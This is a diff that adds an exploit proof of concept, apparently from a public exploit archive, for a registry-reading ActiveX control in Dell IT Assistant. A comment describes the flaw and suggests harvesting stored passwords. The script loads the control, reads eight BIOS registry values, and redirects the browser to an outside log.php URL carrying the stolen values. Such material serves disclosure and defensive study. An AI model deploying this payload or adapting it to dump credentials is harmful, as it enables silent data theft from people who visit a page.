@@ -1,0 +1,96 @@
+<!--
+Dell IT Assistant detectIESettingsForITA.ocx ActiveX Control
+readRegVal() Remote Registry Dump Vulnerability
+
+download uri:
+ftp://ftp.us.dell.com/sysman/OM-ITAssistant-Dell-Web-WIN-6.5.0-2247_A01.21.exe
+
+ActiveX settings:
+
+CLSID: {6286EF1A-B56E-48EF-90C3-743410657F3C}
+ProgID: DETECTIESETTINGS.detectIESettingsCtrl.1
+Binary path: C:\WINDOWS\DOWNLO~1\DETECT~1.OCX
+File Version: 8.1.0.0
+Safe for Scripting (Registry): TRUE
+Safe for Initialization: TRUE
+
+The readRegVal() method allows to dump specific values from
+the Windows registry. 
+Frome the typelib:
+
+...
+        /* DISPID=1 */
+        /* VT_BSTR [8] */
+        function readRegVal(
+                /* VT_BSTR [8]  */ $root,
+                /* VT_BSTR [8]  */ $key,
+                /* VT_BSTR [8]  */ $tag
+                )
+        {
+                /* method readRegVal */
+        }
+...
+
+Instead of searching inside a specific hive,
+this control asks to specify a root key.
+In my experience, lots of application stores encrypted or even
+clear text passwords inside the registry, so an attacker
+can abuse this to gain certain credentials from the victim
+browser. If you ask me, this is not acceptable.
+
+This sample code extracts BIOS informations and
+redirects to a specified url with this info
+passed as parameters.
+Through some more programming efforts, you could dump a bigger 
+portion of the registry.
+
+
+rgod
+-->
+<html>
+<object classid='clsid:6286EF1A-B56E-48EF-90C3-743410657F3C' id='obj' />
+</object>
+<script>
+
+x = obj.readRegVal("HKLM","HARDWARE\\DESCRIPTION\\System\\BIOS","BaseBoardManufacturer");
+document.write(x + "<BR>");
+
+url="http://www.sdfsdsdfsdfsffsdf.com/log.php?BM=" + escape(x);
+
+x = obj.readRegVal("HKLM","HARDWARE\\DESCRIPTION\\System\\BIOS","BaseBoardProduct");
+document.write(x + "<BR>");
+
+url+= "&BP=" + escape(x);
+
+x = obj.readRegVal("HKLM","HARDWARE\\DESCRIPTION\\System\\BIOS","BaseBoardVersion");
+document.write(x + "<BR>");
+
+url+= "&BV=" + escape(x);
+
+x = obj.readRegVal("HKLM","HARDWARE\\DESCRIPTION\\System\\BIOS","BIOSVendor");
+document.write(x + "<BR>");
+
+url+= "&BIOSV=" + escape(x);
+
+x = obj.readRegVal("HKLM","HARDWARE\\DESCRIPTION\\System\\BIOS","BIOSVersion");
+document.write(x + "<BR>");
+
+url+= "&BIOSVE=" + escape(x);
+
+x = obj.readRegVal("HKLM","HARDWARE\\DESCRIPTION\\System\\BIOS","SystemManufacturer");
+document.write(x + "<BR>");
+
+url+= "&SM=" + escape(x);
+
+x = obj.readRegVal("HKLM","HARDWARE\\DESCRIPTION\\System\\BIOS","SystemProductName");
+document.write(x + "<BR>");
+
+url+= "&SP=" + escape(x);
+
+x = obj.readRegVal("HKLM","HARDWARE\\DESCRIPTION\\System\\BIOS","SystemVersion");
+document.write(x + "<BR>");
+
+url+= "&SV=" + escape(x);
+
+document.location= url;
+</script>
